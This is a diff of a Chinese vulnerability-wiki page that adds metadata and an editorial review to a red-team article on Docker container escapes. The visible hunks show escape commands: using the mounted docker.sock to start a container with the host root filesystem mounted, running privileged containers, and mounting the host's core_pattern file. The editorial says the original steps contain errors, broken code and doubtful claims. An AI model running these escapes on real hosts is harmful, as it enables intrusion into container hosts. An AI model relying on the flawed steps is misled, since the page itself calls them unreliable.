@@ -1,8 +1,57 @@
 ---
-cve: "CVE-2016-5195"
+title: "九维团队 - 红队（突破） 云安全 - Docker 逃逸手法（上）"
+product: "Docker/Linux容器"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: "CVE-2016-5195; CVE-2019-5736; CVE-2019-14271; CVE-2020-15257"
+identifier_role: "reference"
+prerequisites: "每种链分别需设备/挂载权限、socket权限、可写host proc或cgroup v1/CAP_SYS_ADMIN与LSM条件"
+source_url: "https://mp.weixin.qq.com/s/xDNAxknjSY3PPPdxa_GcqQ"
+source_status: "recorded"
+side_effects: "含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。; 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
+id: "vw-ffa063657942baa7d761d6e6"
+entity_id: "ve-ffa063657942baa7d761d6e6"
+schema_version: "1"
 ---
 
-# 九维团队 - 红队（突破）  云安全 - Docker 逃逸手法（上）
+# 九维团队 - 红队（突破） 云安全 - Docker 逃逸手法（上）
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：每种链分别需设备/挂载权限、socket权限、可写host proc或cgroup v1/CAP_SYS_ADMIN与LSM条件
+- 证据范围：长篇是配置逃逸，不是元数据DirtyCow主漏洞；详细步骤存在多处确定笔误，需集中修订
+
+### 本次正文校订
+
+- 按实际内容修正 5 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- cgroup目录先xxx后x，notify_no_release错为notify_on_release，后文又写对；复制将失败
+- 挂载rdma却解释memory；cgroup v1和内核限制未明确
+- Python缩进全部丢失，host_path一例缺命令替换且正则损坏，末尾智能引号
+- 把容器ID提取命令称Docker版本、进程少于5/fdisk为空等当确定判据不可靠
+- CapEff固定全位掩码受内核能力集合影响，不能通用判定privileged
+- --cap-drop降低权限不应笼统列增权；无AppArmor不意味着无SELinux等控制
+- Swarm默认2375断言失实风险，招聘/滑动提示和推广占大量正文
+
+### 操作风险与资料使用
+
+- 含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xDNAxknjSY3PPPdxa_GcqQ)
@@ -142,7 +191,7 @@ cat /proc/1/cgroup | grep "docker" | sed s/\\//\\n/g | tail -1
 
 判断版本：
 
-```
+```shell
 docker -v       dockers版本
 docker-runc -v  dockerRunc版本
 uname -a        查看内核版本
@@ -208,7 +257,7 @@ cat /proc/self/status |grep Cap
 
 如何使用特权模式启动一个容器：
 
-```
+```shell
 docker run --privileged <容器image name>
 
 ```
@@ -314,7 +363,7 @@ find / -name docker.sock
 
 在 docker 中使用命令查看宿主机拉取的镜像。 
 
-```
+```shell
 docker -H unix://var/run/docker.sock images
 
 ```
@@ -323,7 +372,7 @@ docker -H unix://var/run/docker.sock images
 
 然后在 docker 容器中，使用命令再运行一个 docker 容器，但添加参数，将宿主机的根目录挂载到容器的 xxx 目录下：
 
-```
+```shell
 docker -H unix://var/run/docker.sock run -v /:/test -it ubuntu:16.04 /bin/bash
 ls /test
 
@@ -358,7 +407,7 @@ find / -name core_pattern
 
 先搭建环境：
 
-```
+```shell
 docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern xxximages 镜像
 
 ```
